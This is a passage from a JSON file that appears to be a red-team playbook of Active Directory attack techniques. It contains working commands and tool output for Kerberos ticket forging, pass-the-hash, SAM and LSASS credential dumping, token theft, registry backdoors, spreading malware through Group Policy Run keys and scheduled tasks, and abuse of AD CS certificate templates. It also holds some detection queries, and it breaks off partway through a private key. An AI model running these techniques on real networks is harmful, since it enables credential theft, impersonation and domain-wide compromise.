        "id": "7f22df56-6eed-4862-b871-675bcbcdc8b5",
        "name": "Trust Ticket",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.003",
        "external": false,
        "description": "NoDescription",
        "content": "1. Get inter-realm key which is responsible for cross forest TGT signing\n2. Forge a Trust Ticket for another domain\n3. Get TGS\n> .\\asktgs path_trust_ticket cifs/dc_of_ext_domain\n\nℹ It should be noted that the targeted domain must have explicit permissions set for groups or users in the trusted domain, something which is not uncommon.\n",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "edd08324-6139-4706-bbe7-aa2857a10cd2",
        "name": "Overpass-the-Hash",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1550.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Overpass-the-Hash\nAuthentication via Kerberos (AES key) rather than NTLM.\n\n### Manually\n[[Use Kerberos ticket (kirbi)]]\n\n### Inject TGT automatically\n- Use [[Rubeus#Request TGT and inject into sacrificial process]]\n\n\n## Detection\nWhen a TGT is requested, event `4768: A Kerberos authentication ticket (TGT) was requested` is generated.\n* NTLM is often KeyType **RC4-HMAC** (0x17) and nowadays not often used.\n* Nowadays used is  **AES256** (0x12).\n\nThis means we can find 4768's where the encryption type is RC4, which can be significant outliers.\n>event.code: 4768 and winlog.event_data.TicketEncryptionType: 0x17\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": true,
        "changes": [
            "\n## [[Rubeus]]\nRubeus allows us to perform opth without needing elevated privileges. The process to follow is:\n\n-   Request a TGT for the user we want to impersonate.\n-   Create a sacrificial logon session.\n-   Pass the TGT into that logon session.\n-   Access the target resource.\n\n#OPSEC Rubeus also has an `/opsec` argument which tells it to send the request without pre-auth, to more closely emulate genuine Kerberos traffic.\n\n### SHA256\n1. Request a hash via [[eKeys]] or [[LSASS dumping]] (not recommended anymore)\n2. Ask for a TGT\n```````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec\n\n[*] Action: Ask TGT\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  7/9/2022 2:58:21 PM\n  EndTime               :  7/10/2022 12:58:21 AM\n  RenewTill             :  7/16/2022 2:58:21 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  aes256_cts_hmac_sha1\n  Base64(key)           :  x4F1hxBrfwvgleEHnYbg9KV5fch2VOS5m36IO/srA0g=\n```````\n\n### RC4\n``````beacon\nMost public articles demonstrate using the NTLM hash to request the TGT.\n\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap\n\n[*] Action: Ask TGT\n\n[*] Using rc4_hmac hash: 4ffd3eabdce2e158d923ddec72de979e\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  7/9/2022 2:46:58 PM\n  EndTime               :  7/10/2022 12:46:58 AM\n  RenewTill             :  7/16/2022 2:46:58 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  rc4_hmac\n  Base64(key)           :  Z1/VMlSwxK4jrbL8qmjvNw==\n``````"
        ],
        "tools": [
            "Rubeus"
        ],
        "steps": []
    },
    {
        "id": "4eaec5b9-9ee3-4108-8b71-61ec050fe6c8",
        "name": "Pass-the-Hash",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1550.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Pass-the-Hash\nIt allows you to authenticate to a Windows service using the NTLM hash of a user. It works by starting a new logon session with a wrong details and replacing all session information like the domain, username and NTLM hash.  \nThe tool of choice would be [[Mimikatz]].\n\n\u26a0\ufe0f Warning\n* This requires patching LSASS which can be easily detected or prevented by PPL and requires local admin privs.  \n* Not providing `/run` will spawn the process with UI (expected running as SYSTEM).\n\n#OPSEC No LSASS memory patch and no admin rights are required with [[Overpass-the-Hash]]\n\n## Detection\n* Sysmon will record the process creation event for `cmd.exe` including the command line arguments `echo 1cbe909fe8a > \\\\.\\pipe\\16ca6d.`  \nIn Kibana:\n>event.module: sysmon and event.type: process_start and process.name: cmd.exe and process.command_line: *\\\\\\\\.\\\\pipe\\\\*\n* Event `4624` with logon type 9 will be recorded. This event records the executing user's Logon ID, which we can cross reference from the process creation event above.\n>event.code: 4624 and winlog.logon.id: 0xe6d64\n\n## Troubleshoot\n1. There is a problem if the account is not RID-500 (Admin) and only in the admin group\n\n2. The two registry entries needed are:\n    ```powershell\n    Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord\n    Set\u2014ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord\n    ```\n    OR\n    ```powershell\n    reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n    reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v RequireSecuritySignature /t REG_DWORD /d 0 /f\n    ```\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n#OPSEC this to specify the programm and avoid the weird piping into cmd.exe\n## Recommended\n``````beacon\nbeacon> mimikatz sekurlsa::pth /user:doe /domain:edu.evil.corp /ntlm:4ffd3eabdce2e158d923ddec72de979e\n\nuser    : doe\ndomain    : edu.evil.corp\nprogram    : cmd.exe\nimpers.    : no\nNTLM    : 4ffd3eabdce2e158d923ddec72de979e\n  |  PID  6284\n  |  TID  6288\n  \nbeacon> steal_token 6284\n[+] Impersonated NT AUTHORITY\\SYSTEM\n``````"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": []
    },
    {
        "id": "a0aae509-b9d7-4313-a3d2-8d715a3ee1cc",
        "name": "Remote Registry",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1112",
        "external": false,
        "description": "NoDescription",
        "content": "# Remote Registry\nThe [DAMP](https://github.com/HarmJ0y/DAMP) project modify host-based DACL to enable a \"backdoors\" which remotly retrieves secrets from a machine, including SAM and domain cached hashes enabling the creation of [[Silver Ticket]]s.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Add-RemoteRegBackdoor]]\n`Add-RemoteRegBackdoor` can be run locally on a compromised machine, or remotely with credentials.\n```beacon\nbeacon> run hostname\nsrv2\n\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\n\nbeacon> powershell Add-RemoteRegBackdoor -Trustee EDU\\john\nComputerName BackdoorTrustee\n------------ ---------------\nSRV2        EDU\\john\n```\n\n```beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> ls \\\\srv2\\c$\n[-] could not open \\\\srv2\\c$\\*: 5\n\nbeacon> powershell Get-RemoteMachineAccountHash -ComputerName srv2\n\nComputerName MachineAccountHash              \n------------ ------------------              \nsrv2        5d0d485386727a8a92498a2c188627ec\n```"
        ],
        "tools": [
            "Add-RemoteRegBackdoor"
        ],
        "steps": []
    },
    {
        "id": "4dc1dc4d-e4d0-4458-b51e-874d080c0ac4",
        "name": "Security Account Manager",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Security Account Manager\nThe Security Account Manager (SAM) database holds the NTLM hashes of local accounts. These can be extracted with `lsadump::sam`.  \nImportant to check for credentails reuse.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n``````\nbeacon> mimikatz lsadump::sam\n\nDomain : SRV1\nSysKey : 5d11b46a92921b8775ca574306ba5355\nLocal SID : S-1-5-21-4124990477-354564332-720757739\n\nSAMKey : fb5c3670b47e5ecae21f328b12d3103c\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: 12a427a6fdf69be4917d30afc633f6fd\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000001f7 (503)\nUser : DefaultAccount\n``````",
            "\n## [[Secretsdump]]\nReceiving machine passwords via impacket (Admin):\n    ```powershell\n    # Change permissions of hklm\\security to full access\n    reg save hklm\\sam c:\\temp\\sam.save\n    reg save hklm\\security c:\\temp\\security.save\n    reg save hklm\\system c:\\temp\\system.save\n    secretsdump.py -sam C:\\Users\\ext_ecorp_admin\\Desktop\\sam.save -security C:\\Users\\ext_ecorp_admin\\Desktop\\security.save -system C:\\Users\\ext_ecorp_admin\\Desktop\\system.save LOCAL\n    ```\n\n## References"
        ],
        "tools": [
            "Mimikatz",
            "Secretsdump"
        ],
        "steps": []
    },
    {
        "id": "c423b306-a2e0-4e2a-ad08-ac83bd8f0c78",
        "name": "Silver Ticket",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558.002",
        "external": false,
        "description": "Extract kerberos ticket from memory",
        "content": "# Silver Ticket\nA Silver Ticket is a forged TGS, signed using the secret material (RC4/AES keys) of a machine account. You may forge a TGS for any user to any service on a specific machine. This access will remain until the computer account password changes, which is every 30 days by default.\n\n#OPSEC Silver and [[Golden Ticket]] can be generated \"offline\" and imported into your session. This saves executing Mimikatz on the target. Generating both silver and golden tickets can be done with [[Mimikatz#Create silver ticket]].\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n### Create silver ticket\n1. [[DCSync]] the krbtgt user\n2. Generate [[Silver Ticket]]\nWhere:\n-   `/user` is the username to impersonate.\n-   `/domain` is the current domain name.\n-   `/sid` is the current domain SID.\n-   `/target` is the target machine.\n-   `/aes256` is the AES256 key for the target machine.\n-   `/ticket` is the filename to save the ticket as.\n```beacon\nmimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi\nUser      : Administrator\nDomain    : edu.evil.corp (EDU)\nSID       : S-1-5-21-3263068140-2042698922-2891547269\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 - aes256_hmac\nService   : cifs\nTarget    : srv2\nLifetime  : 25/05/2022 10:30:08 ; 23/05/2031 10:30:08 ; 23/05/2031 10:30:08\n-> Ticket : srv2-cifs.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n```\n3. [[Use Kerberos ticket (kirbi)]]\n\nHere are some useful ticket combinations:\n| Technique         | Required Service Tickets |\n| ----------------- | ------------------------ |\n| psexec            | CIFS                     |\n| winrm             | HOST & HTTP              |\n| dcsync (DCs only) | LDAP                     |"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": []
    },
    {
        "id": "a5a297db-6273-4302-ba9d-dac57e30224e",
        "name": "SpawnAs",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# SpawnAs\nThis will spawn a new beacon process using the plain-text credentials of another user. This includes a new logon session from interactive logon type which allows you to use the privs on the machine itself.\nIt does not required local admin privileges.\n\n```cmd\nbeacon> spawnas EDU\\doe P4ssw0rd1. tcp-4444-local\n[+] established link to child beacon: 10.10.17.231\n```\n#OPSEC It creates a user profile on disk.\n\n\u26a0\ufe0f WARNING  \nDo not run this from a directory where the target user does not have read access, or from a SYSTEM beacon\n> \n> beacon> spawnas EDU\\doe Passw0rd1 tcp-4444-local\n> [-] could not run C:\\Windows\\system32\\rundll32.exe as EDU\\doe: 267\n> [-] Could not connect to target\n> \n> `cd` to a another directory like `C:\\` and try again.\n\n## Detection\n* Event `4624: An account was successfully logged on` but with a logon type of `2` (LOGON32_LOGON_INTERACTIVE). \n    * Executing user = TargetUserName\n    * Impersonated user = TargetOutboundUserName.\n* Sysmon event 1 (Process Create) because Cobalt Strike spawns rundll32 by default.\n>event.type: process_start and process.name: rundll32.exe\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "094c790c-dd71-44f8-aeae-ac97d138abef",
        "name": "Steal Token",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558",
        "external": false,
        "description": "NoDescription",
        "content": "# Steal Token\nThe `steal_token` command will impersonate the access token of the target process. Like `make_token`, only for network, not local actions.\n\nThis command opens a handle to another users target process in order to duplicate and impersonate the access token, and therefore requires local admin privileges.\n``````beacon\nbeacon> ls \\\\srv2\\c$\n[-] could not open \\\\srv2\\c$\\*: 5\n\nbeacon> steal_token 3320\n[+] Impersonated EDU\\doe\n\nbeacon> ls \\\\srv2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "6bdbf381-10b4-4aec-944c-694b633b7711",
        "name": "Validate Credentials",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1078",
        "external": false,
        "description": "Validate Credentials",
        "content": "# Validate Credentials\nIn order to not trigger any logon events it is recommended to try validating especially service accounts against the DC directly.\n\n## LDAP\nADExplorer can be used to login and verify\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ldapsearch]]\n1. Get [[Domain Controller]]\n2. Login\n    `.\\\\ldapsearch.exe -x -h 127.0.0.1 -b dc=maxcrc,dc=com -w PW -D \"cn=admin\"`\n\n3. Flags\n    * x: anonymous connect\n    * h: server\n    * b: root (domain component)\n    * w: password\n    * W: interactive password\n    * D: binddn - user"
        ],
        "tools": [
            "ldapsearch"
        ],
        "steps": []
    },
    {
        "id": "0f8f858c-9417-4ae9-a47a-5139b129d2ee",
        "name": "Discretionary Access Control Lists (DACL)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Discretionary Access Control Lists (DACL)\nA principal has ACLs on more privileged accounts (like via IT-Support OU), that enable them to takeover the account.\n\nInteresting permissions:\n* GenericAll\n* WriteProperty\n* WriteDacl\n\n## WriteDacl\nGrant [[Discretionary Access Control Lists (DACL)#GenericAll]] to any principle.\n\n## WriteOwner\nChange the ownership of the object to any principal which would then inherit GenericAll over it.\n\n## GenericAll\n### Password Reset\n\u26d4 Use NEVER (only with explicit permission of the customer)  \n#OPSEC very bad\n``````beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> make_token EDU\\doe Passw0rd1\n[+] Impersonated EDU\\john\n\nbeacon> run net user jonas Password123. /domain\n\nThe request will be processed at a domain controller for domain edu.evil.corp.\n\nThe command completed successfully.\n``````\n\n### Add SPN for [[Kerberoasting]]\n1. Set an SPN via [[PowerView#Change DomainObject (SPN)]]\n2. Can be performed via [[Rubeus#Targeted Kerberoasting]]\n\n### Add SPN for [[AS-REP Roasting]]\nModify the User Account Control value on the account to disable preauthentication and then ASREProast it.\n1. [[PowerView#Add DONT_REQ_PREAUTH flag]]\n2. [[Rubeus#AS-REP Roasting]]\n\n### Add and remove members\n* Add join to `SQL Admins`\n> run net group \"SQL Admins\" john /add /domain\n* Check johns groups\n> run net user john /domain\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[PowerView]]\n[[Change Domain Objects]]\n#### Change DomainObject (SPN)\n\n```powershell\nSet-DomainObject -Identity jonas -Set @{serviceprincipalname=\"fake/NOTHING\"}\n```"
        ],
        "tools": [
            "PowerView"
        ],
        "steps": []
    },
    {
        "id": "9ea8347c-cc06-47df-80c1-6a36c2bf8071",
        "name": "Group Policy (GPO)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Group Policy (GPO) \nGroup Policy Objects are collections of controls bound to computers or users within a OU.\n\nAny domain user can read the GPOs and its permissions\n-   Create GPOs\n-   Modify existing GPOs\n-   Link GPOs to OUs\n\n## Identify\nIf installed use the native GPO report commands `Get-GPOReport` and `gpresult` utility. It can be exported and viewed as HTML. If not availabel use [[Dump GPOs]]\n\n## Abuse\nWe can abuse these by modifying existing GPOs or creating and linking new GPOs to gain code execution or otherwise manipulate computer configurations.\n- [[PowerView#Create new GPOs]]\n- [[PowerView#Link GPOs]]\n- [[PowerView#WriteProperty, WriteDacl, WriteOwner]]\n\n\n## Watch for\n* PowerShell logging policy\n* Full auditing policy\n* Prevent local account at logon\n* Add server admin to local administrator gorup\n* Enhanced Mitigation Experience Toolkit (EMET) configuration\n* AppLocker configuration",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[BloodHound]]\nGeneric Write on GPOs\n>MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p\n\n### WriteProperty, WriteDacl, WriteOwner affecting OU\n1st Line Support has **GenericAll** on multiple users and groups\n>MATCH (g1:Group {name:\"1ST LINE SUPPORT@edu.evil.corp\"}), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p",
            "\n## [[GPRegistryPolicyParser]]\n`Parse-PolFile` from the [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.\n```beacon\nPS C:\\Users\\Administrator\\Desktop> Parse-PolFile .\\Registry.pol\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : PasswordComplexity\nValueType   : REG_DWORD\nValueLength : 4\nValueData   : 3    <-- Password contains uppers, lowers and numbers (4 would also include specials)\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : PasswordLength\nValueType   : REG_DWORD\nValueLength : 4\nValueData   : 14   <-- Password length is 14\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : PasswordAgeDays\nValueType   : REG_DWORD\nValueLength : 4\nValueData   : 7    <-- Password is changed every 7 days\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : AdminAccountName\nValueType   : REG_SZ\nValueLength : 14\nValueData   : lapsadmin   <-- The name of the local admin account to manage\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : AdmPwdEnabled\nValueType   : REG_DWORD\nValueLength : 4\nValueData   : 1   <-- LAPS is enabled\n```",
            "\n## [[Remote Server Administration Tools (RSAT)]]\nCreate a new GPO and immediately link it to the target OU:\n\n#OPSEC The GPO will be visible in the Group Policy Management Console and other RSAT GPO tools, so make sure the name is \"convincing\".\n``````beacon\nbeacon> getuid\n[*] You are EDU\\doe\n\nbeacon> powershell New-GPO -Name \"Evil GPO\" | New-GPLink -Target \"OU=Workstations,DC=edu,DC=evil,DC=corp\"\n\nGpoId       : d9de5634-cc47-45b5-ae52-e7370e4a4d22\nDisplayName : Evil GPO\nEnabled     : True\nEnforced    : False\nTarget      : OU=Workstations,DC=edu,DC=evil,DC=corp\nOrder       : 4\n``````\n\n## Distribute Malware\n1. Identify share [[PowerView#Identify Shares]] or create share [[Create Share]]\n2. Upload malware\n``````beacon\nbeacon> cd \\\\dc-2\\software\nbeacon> upload C:\\Payloads\\pivot.exe\nbeacon> ls\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n 281kb    fil     03/10/2022 13:54:10   pivot.exe\n``````\n3. Create GPO (be very carefull what you do)\n``````beacon\nbeacon> powershell Set-GPPrefRegistryValue -Name \"Evil GPO\" -Context Computer -Action Create -Key \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -ValueName \"Updater\" -Value \"%COMSPEC% /b /c start /b /min \\\\dc-2\\software\\pivot.exe\" -Type ExpandString\n\nDisplayName      : Evil GPO\nDomainName       : edu.evil.corp\nOwner            : EDU\\doe\nId               : d9de5634-cc47-45b5-ae52-e7370e4a4d22\nGpoStatus        : AllSettingsEnabled\nDescription      : \nCreationTime     : 5/26/2022 2:35:02 PM\nModificationTime : 5/26/2022 2:42:08 PM\nUserVersion      : AD Version: 0, SysVol Version: 0\nComputerVersion  : AD Version: 1, SysVol Version: 1\nWmiFilter        :\n``````\n4. Wait. Every machine will typically refresh their GPOs automatically every couple of hours.",
            "\n## [[SharpGPOAbuse]]\nAdd an Immediate Scheduled Task to existing GPO\n``````beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> execute-assembly C:\\Tools\\SharpGPOAbuse\\SharpGPOAbuse\\bin\\Debug\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Install Updates\" --Author NT AUTHORITY\\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\\\dc-2\\software\\pivot.exe\" --GPOName \"PowerShell Logging\"\n\n[+] Domain = edu.evil.corp\n[+] Domain Controller = dc-2.edu.evil.corp\n[+] Distinguished Name = CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\n[+] GUID of \"PowerShell Logging\" is: {AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\n[+] Creating file \\\\edu.evil.corp\\SysVol\\edu.evil.corp\\Policies\\{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n[+] versionNumber attribute changed successfully\n[+] The version number in GPT.ini was increased successfully.\n[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.\n[+] Done!\n```````"
        ],
        "tools": [
            "BloodHound",
            "GPRegistryPolicyParser",
            "Remote Server Administration Tools (RSAT)",
            "SharpGPOAbuse"
        ],
        "steps": []
    },
    {
        "id": "92ea815c-fcbf-48d1-8751-69fb0d9de1cf",
        "name": "WSUS",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "Identify if the Windows Update Service is running via the insecure protocol http",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt",
            "WSuspicious"
        ],
        "steps": []
    },
    {
        "id": "63d62330-603b-4b4f-9db2-fb66c022b16f",
        "name": "Active Directory Certificate Service",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Active Directory Certificate Service\nActive Directory Certificate Services (AD CS) is a server role that allows you to build a public key infrastructure (PKI). This includes public keys, digital certificates and signatures like (S/MIME), 802.1x, smart card logon, and SSL/TLS.\n\nTo find AD CS Certificate Authorities (CA's) in a domain or forest, run [[Certify]] with the cas parameter. [[Certify#Get certificat details]]\n\nVulnerabilities:\n- [[Misconfigured Certificate Templates]]\n- [[NTLM Relaying to ADCS]]\n\n## Detection\n* AD CS logging is not enabled by default. Logging for the following event can be enabled:\n![](/Images/adcs.png)\n* `Audit Certification Services` must be enabled via GPO.\n* Event `4886`, \"Certificate Services received a certificate request\".\n```kibana\nevent.code: 4886\n\nRequest ID:\t7\nRequester:\tDEV\\patrick\nAttributes:\t\n  ccm:wkstn-3.evil.corp\n```\n* Event `4887` if the request was successful, and a certificate issued.  \nFind requester: Lookup the certificate by `Request ID` and look at the \"Subject Alternative Name\".\n* Event `4768` on the DC if a TGT is requested and will contain the certificate if used.\n``````kibana\nCertificate Information:\n Certificate Issuer Name:   ca1\n Certificate Serial Number:\t65000022376D7D5EBB98E12D17600000000067\n Certificate Thumbprint:\t3EB5532F3B986D7591EAB07D0C9EB1BFA3577C5F\n``````\n\nRead more [here](https://www.specterops.corp/assets/resources/Certified_Pre-Owned.pdf) a blogpost published by [Will Schroeder](https://twitter.com/harmj0y) & [Lee Christensen](https://twitter.com/tifkin_).\n\n## Tools\n########\n########",
        "category": "Active Directory Certificate Service",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "7cbd36e5-9a72-4725-b178-a6b89a1ce0d4",
        "name": "Misconfigured Certificate Templates",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Misconfigured Certificate Template\n1. Find any vulnerable templates.\n ![](/Images/Pasted%20image%2020220316231825.png)\n\nImportant fields:\n| Field | Value | Desc |\n| ----- | ----- | ---- |\n| Certificate Authority | `dc-1.evil.corp\\ca-1` | Cert authority |\n| Template | `VulnerableUserTemplate` | Cert Template |\n| msPKI-Certificate-Name-Flag | `ENROLLEE_SUPPLIES_SUBJECT` | allows to provide a SAN (subject alternative name) |\n| pkiextendedkeyusage | `Client Authentication`| allows for Client authentication | \n| Enrollment Rights | `\\Domain Users` | Domain Users can request the cert |\n| Object Control Permissions | `WriteOwner`, `WriteDacl`, `WriteProperty` |\nChange Templates |\n\n2. Request a user certificate.\n3. Copy the whole certificate (including the private key) and save it to `cert.pem`. \n4. Use the `openssl` to convert it into pfx format.\n    ``````sh\n    openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n    Enter Export Password:\n    Verifying - Enter Export Password:\n    ``````\n5. Convert `cert.pfx` into a base64 encoded string and use [[Rubeus#Ask TGT via certificate]]. \n    ```sh\n    cat cert.pfx | base64 -w 0\n    ```\n\n\n## Tools\n########\n########",
        "category": "Active Directory Certificate Service",
        "stealthy": false,
        "changes": [
            "\n## [[Certify]]\nGet certificat details\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe cas\n\n[*] Root CAs\n\n Cert SubjectName              : CN=ca-1, DC=evil, DC=corp\n Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71\n Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668\n Cert Start Date               : 2/25/2022 11:29:14 AM\n Cert End Date                 : 2/25/2047 11:39:08 AM\n Cert Chain                    : CN=ca-1,DC=evil,DC=corp\n\n[*] Enterprise/Enrollment CAs:\n\n Enterprise CA Name            : ca-1\n DNS Hostname                  : dc-1.evil.corp\n FullName                      : dc-1.evil.corp\\ca-1\n Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n Cert SubjectName              : CN=ca-1, DC=evil, DC=corp\n Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71\n Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668\n Cert Start Date               : 2/25/2022 11:29:14 AM\n Cert End Date                 : 2/25/2047 11:39:08 AM\n Cert Chain                    : CN=ca-1,DC=evil,DC=corp\n\n Enterprise CA Name            : ca-2\n DNS Hostname                  : dc-2.edu.evil.corp\n FullName                      : dc-2.edu.evil.corp\\ca-2\n Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n Cert SubjectName              : CN=ca-2, DC=edu, DC=evil, DC=corp\n Cert Thumbprint               : 2D0349C77D35808E35A7C6815CF37B51D9A5D431\n Cert Serial                   : 64000000067ED180604220703C000000000006\n Cert Start Date               : 3/1/2022 10:45:07 AM\n Cert End Date                 : 3/1/2024 10:55:07 AM\n Cert Chain                    : CN=ca-1,DC=evil,DC=corp -> CN=ca-2,DC=edu,DC=evil,DC=corp\n``````\n\n## Find vulnerable certificates\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe find /vulnerable\n``````\n\n## Request certificate for user\nThis configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain.  Request a certificate.\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request /ca:dc-1.evil.corp\\ca-1 /template:VulnerableUserTemplate /altname:nglover\n\n[*] Action: Request a Certificates\n\n[*] Current user context    : EDU\\patrick\n[*] No subject name specified, using current context as subject.\n\n[*] Template                : VulnerableUserTemplate\n[*] Subject                 : CN=Isabel Yates, CN=Users, DC=evil, DC=corp\n[*] AltName                 : nglover\n\n[*] Certificate Authority   : dc-1.evil.corp\\ca-1\n\n[*] CA Response             : The certificate had been issued.\n[*] Request ID              : 4\n\n[*] cert.pem         :\n\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA7+QJhT7SgrP2SLWI7JqilriLBFjGRgob7sK6Gt8/EN4ODCqA\n[...snip...]\nEZCgtNFHJpynmPVNEcocncFPtV1hskXIElcwer/EdIROOW+qZhan\n-----END RSA PRIVATE KEY-----\n-----BEGIN 